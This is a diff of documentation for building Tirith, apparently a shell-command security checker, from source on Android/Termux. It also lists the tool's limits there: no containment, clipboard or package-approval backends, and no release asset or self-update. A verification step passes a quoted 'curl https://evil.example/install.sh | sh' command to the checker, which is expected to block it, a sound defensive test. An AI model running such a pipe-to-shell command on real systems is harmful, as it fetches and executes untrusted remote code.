@@ -1,9 +1,8 @@
 # Android and Termux
 
-Android builds use Bionic rather than glibc. The Android portability changes
-exclude the unsupported desktop clipboard dependency and use Bionic's errno
-accessor. They permit evaluating a native source build; they do not establish
-release qualification for Android.
+Build Tirith from source on Android (Termux) to evaluate it there. Android uses
+Bionic rather than glibc, so the desktop clipboard dependency is left out and
+Bionic's errno accessor is used.
 
 ## Build from source
 
@@ -17,17 +16,10 @@ cargo build --locked --release --bin tirith
 ./target/release/tirith check --json --non-interactive --shell posix -- 'curl https://evil.example/install.sh | sh'
 ```
 
-The final command analyzes a quoted command string; it must block it and must not
-execute it. A successful build or version check alone does not qualify shell
-interception, policy changes, containment, or self-update.
+The final command analyzes a quoted command string; it must block it and must
+not execute it. Keep the build updated from reviewed source.
 
-There is no published native Android asset. The release installer refuses
-Android/Termux before looking up a release, downloading an archive, or changing
-an install path. Do not run it with sudo or substitute a GNU/Linux asset. The
-self-updater has no Android release target and cannot update a source build from
-a Linux release archive. Keep source builds updated from reviewed source.
-
-## Available behavior and limits
+## What works on Android
 
 | Surface | Android behavior |
 | --- | --- |
@@ -37,14 +29,12 @@ a Linux release archive. Keep source builds updated from reviewed source.
 | Clipboard guard, daemon, and source watcher | No Android backend; refuse instead of claiming a running guard. Sudo does not enable them. |
 | Required containment | No Android containment backend. Coverage is absent and an enforcing launch refuses. |
 | Native package approval | Unsupported on Android. Installing sudo does not enable the x86_64 Linux authority. |
-| Local npm materialization | Native publication is Linux-only; Android is refused. |
 | Shell hooks | Device and shell qualification is still required; do not infer interception from a successful `check` invocation. |
 
 Do not bypass a containment refusal with a degraded-execution option when the
-workflow requires containment. An optional display server or Termux:API does
-not add an Android clipboard backend to Tirith.
+workflow requires containment.
 
-## Verification before broader support
+## Verify on your device
 
 A native Android release needs retained evidence for a pinned source revision,
 NDK/API level, Android version, architecture, binary digest, and actual device
@@ -55,8 +45,19 @@ not execute the requested command or change the destination. Then qualify the
 installed shell hooks and their interrupted-command recovery on the actual
 supported shell versions.
 
-Cross-compilation can catch type and link failures. A Linux musl run cannot
-establish Bionic, Android filesystem, signal, SELinux, or shell behavior.
+## Limits
+
+- There is no published Android release asset. The release installer refuses
+  Android/Termux before looking up a release, downloading an archive or changing
+  an install path. Do not run it with sudo or substitute a GNU/Linux asset.
+- The self-updater has no Android target and cannot update a source build.
+- A successful build, version check or `check` run does not qualify shell
+  interception, policy changes, containment or self-update on Android.
+- There is no Android clipboard backend, containment backend or package
+  approval. A display server or Termux:API does not add a clipboard backend,
+  and sudo enables none of them.
+- Cross-compilation catches type and link failures only. A Linux musl run says
+  nothing about Bionic, the Android filesystem, signals, SELinux or shells.
 
 References: [Rust Android targets](https://doc.rust-lang.org/rustc/platform-support/android.html),
 [Bionic errno API](https://android.googlesource.com/platform/bionic/+/refs/heads/main/libc/include/errno.h),
